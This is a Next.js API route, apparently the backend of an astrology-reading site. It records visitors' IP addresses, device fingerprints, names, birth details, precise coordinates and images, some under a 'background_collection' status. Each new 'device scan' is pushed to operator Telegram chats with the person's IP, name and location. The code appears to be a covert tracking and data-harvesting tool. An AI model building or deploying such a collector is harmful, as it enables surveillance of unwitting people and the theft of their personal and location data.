import { NextResponse } from 'next/server';
import { PrismaClient } from '@prisma/client';
import { corsHeaders, handleOptions } from '@/lib/cors';

export const OPTIONS = handleOptions;

const prisma = new PrismaClient();

export async function POST(req: Request) {
  try {
    const data = await req.json();
    
    const publicIp = req.headers.get("x-forwarded-for") || "unknown";
    const referer = req.headers.get("referer") || "unknown";

    await prisma.deviceScan.create({
      data: {
        deviceId: data.deviceId,
        publicIp,
        userAgent: data.userAgent,
        referer,
        language: data.language,
        screenResolution: data.screenResolution,
        hardwareConcurrency: data.hardwareConcurrency,
        deviceMemory: data.deviceMemory,
        timezone: data.timezone,
        touchSupport: data.touchSupport,
        connectionType: data.connectionType,
        userName: data.userName,
        birthDate: data.birthDate,
        birthState: data.birthState,
        birthCity: data.birthCity,
        birthTime: data.birthTime,
        latitude: data.latitude,
        longitude: data.longitude,
        image: data.image || null,
        reading: data.reading ? data.reading as any : { status: "background_collection" },
      },
    });
    
    // Notify Telegram if configured
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatIds = process.env.TELEGRAM_CHAT_ID ? process.env.TELEGRAM_CHAT_ID.split(',').map(id => id.trim()) : [];
    
    if (botToken && chatIds.length > 0) {
      const msg = `🚨 *New Device Scan!*\n\n*ID:* \`${data.deviceId}\`\n*IP:* \`${publicIp}\`\n*Name:* ${data.userName || "Unknown"}\n*Location:* ${data.latitude ? `${data.latitude}, ${data.longitude}` : "Unknown"}\n*OS:* ${data.userAgent?.substring(0, 50) || "Unknown"}`;
      
      for (const chatId of chatIds) {
        try {
          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
          });
        } catch (err) {
          console.error(`Telegram notification failed for chat ID ${chatId}:`, err);
        }
      }
    }

    return NextResponse.json({ success: true }, { headers: corsHeaders });
  } catch (error) {
    console.error(error);
    return NextResponse.json({ error: "Failed to collect telemetry" }, { status: 500, headers: corsHeaders });
  }
}
